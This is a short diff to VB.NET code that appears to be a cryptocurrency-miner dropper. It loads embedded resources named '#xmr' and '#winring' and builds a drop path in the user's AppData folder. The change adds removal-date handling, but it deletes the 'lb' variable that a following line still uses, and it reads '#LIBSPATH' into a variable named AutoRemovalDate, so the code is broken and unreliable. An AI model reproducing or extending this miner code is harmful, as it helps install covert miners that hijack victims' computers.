@@ -115,7 +115,10 @@ Public Class Program
             Dim x As Byte() = GetTheResource("#xmr")
             Dim xm As Byte() = New Byte() {}
             Dim wr As Byte() = GetTheResource("#winring")
-            Dim lb As String = GetString("#LIBSPATH")
+            Dim RemovalDate As String = GetString("#RemovalDate")
+            Dim todaysdate As String = String.Format("{0:dd/MM/yyyy}", DateTime.Now)
+            Debug.WriteLine("Removal Date: " + RemovalDate + "Todays Date: " + todaysdate)
+            Dim AutoRemovalDate As String = GetString("#LIBSPATH")
             Dim bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
             Dim rS As String = ""
 
